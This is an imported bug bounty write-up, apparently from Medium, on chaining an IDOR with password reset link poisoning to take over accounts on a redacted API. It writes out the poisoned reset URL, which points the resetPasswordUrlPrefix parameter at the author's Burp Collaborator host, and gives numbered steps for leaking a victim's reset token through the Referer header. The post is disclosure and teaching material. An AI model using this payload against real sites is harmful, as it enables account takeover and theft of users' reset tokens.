---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-10_chaining-password-reset-link-poisoning-idor-and-information-leakage-to-achieve-a_2.md
original_filename: 2020-11-10_chaining-password-reset-link-poisoning-idor-and-information-leakage-to-achieve-a_2.md
title: Chaining password reset link poisoning, IDOR, and information leakage to achieve
  account takeover at api.redacted.com
category: documents
detected_topics:
- password-reset
- api-security
- idor
- access-control
- command-injection
- mfa
tags:
- imported
- documents
- password-reset
- api-security
- idor
- access-control
- command-injection
- mfa
language: en
raw_sha256: ffc0fdabaaba4deb12de73cd46ba8a11b06126332bd1ed2817a98294233ea6fd
text_sha256: 876f9a7a75d8d65de5e0b14064bf50035cbf5bd8d4eb6ff4a1531278ece05937
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Chaining password reset link poisoning, IDOR, and information leakage to achieve account takeover at api.redacted.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-10_chaining-password-reset-link-poisoning-idor-and-information-leakage-to-achieve-a_2.md
- Source Type: markdown
- Detected Topics: password-reset, api-security, idor, access-control, command-injection, mfa
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `ffc0fdabaaba4deb12de73cd46ba8a11b06126332bd1ed2817a98294233ea6fd`
- Text SHA256: `876f9a7a75d8d65de5e0b14064bf50035cbf5bd8d4eb6ff4a1531278ece05937`


## Content

---
title: "Chaining password reset link poisoning, IDOR, and information leakage to achieve account takeover at api.redacted.com"
page_title: "Taking over multiple user accounts | InfoSec Write-ups"
url: "https://medium.com/bugbountywriteup/chaining-password-reset-link-poisoning-idor-account-information-leakage-to-achieve-account-bb5e0e400745"
authors: ["Jadek Mark (@mase289)"]
bugs: ["HTTP header injection"]
publication_date: "2020-11-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4148
scraped_via: "browseros"
---

# Chaining password reset link poisoning, IDOR, and information leakage to achieve account takeover at api.redacted.com

Top highlight

Chaining password reset link poisoning, IDOR, and information leakage to achieve account takeover at api.redacted.com
Mase289
Follow
3 min read
·
Nov 10, 2020

524

4

Press enter or click to view image in full size

While assessing a target web application for impactful vulnerabilities, a useful check to conduct might be looking through the waybackmachine to discover URLs that have existed on the target over time. These might expose critcal functionality that could then be tested for bugs. This happened to be the case for a bug bounty target i was hunting on.

A user could reset their account password through the following endpoint. https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com

While doing recon, i like to automate the process of finding URLs using waybackurls. Searching through the results from the tool revealed an alternative version of the password reset endpoint that included an interesting parameter (resetPasswordUrlPrefix).

https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&resetPasswordUrlPrefix=https%3A%2F%web.archive.org%2Fsave%2F_embed%2Fhttps%3A%2F%2Faccounts.redacted.com%2Fmember%2Freset-password

Get Mase289’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Also interesting to note was that there were no access controls on the /v3/users/ endpoint allowing any user to retrieve information belonging to another by simply changing the email address or handle parameters in the request. (The two parameters were interchangeable).

Press enter or click to view image in full size
API endpoint leaking user handle, email, ID, firstName, LastName

So an idea came to mind while trying to figure out the use of the resetPasswordUrlPrefix parameter. What if i supplied a payload from burpcollaborator while resetting my account password?

https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password

This resulted in some DNS and HTTP interactions in my burpcollaborator client indicating that the password reset token was leaked in the referer header. This information was sufficient for a Proof of Concept so it was time to write up a report.

Press enter or click to view image in full size
Password reset token is leaked in referer header

I demonstrated my proof of concept in the following steps ;

Register for two accounts on the program for testing purposes and login to one account.

2. Make a request to the affected endpoint replacing the email address or handle with one belonging to your victim account.

https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password

3. The victim account will receive a password reset link prefixed with the attackers domain.

Press enter or click to view image in full size
Victim account receives poisoned link embedded with attacker-controlled domain

4.Once the victim clicks on the poisoned link, the attacker will receive a request to his/her domain with the victim’s password reset token visible in the referer header.

5. The attacker loads the password reset link in a web browser and sets a new password for the victim account-completing the account takeover.

This turned out to be a duplicate issue. (Meaning somebody else had already reported it to the program) but a particularly cool bug none the less.

Please leave a clap if you enjoyed reading this writeup and be sure to check out my other writeups on issues I discovered during my bug hunting journey.

You can follow me on Twitter https://twitter.com/mase289 where i share bugbounty related content. Till next time, happy hunting!
